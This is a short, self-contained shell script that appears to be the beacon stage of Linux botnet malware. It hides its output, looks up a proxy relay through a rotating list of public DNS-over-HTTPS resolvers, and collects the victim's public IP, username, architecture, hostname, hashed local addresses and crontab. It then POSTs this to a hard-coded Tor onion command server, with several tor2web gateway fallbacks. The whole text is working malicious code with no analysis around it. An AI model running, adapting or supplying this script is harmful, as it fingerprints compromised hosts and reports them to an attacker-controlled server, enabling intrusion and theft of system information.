exec &>/dev/null
export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
c=$(echo "curl -4sSLkA- -m200")
t=$(echo "i62hmnztfpzwrhjg34m6ruxem5oe36nulzmxcgbdbkiaceubprkta7ad")

sockz() {
n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)
p=$(echo "dns-query?name=relay.tor2socks.in")
s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)
}

ibot() {
sockz
f=/bot
r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0)
$c -X POST -x socks5h://$s:9050 -e$r $t.onion$f || $c -X POST -e$r $1$f
}

ibot $t.tor2web.in || ibot $t.tor2web.in || ibot $t.tor2web.to || ibot $t.onion.com.de || ibot $t.tor2web.io || ibot $t.onion.sh
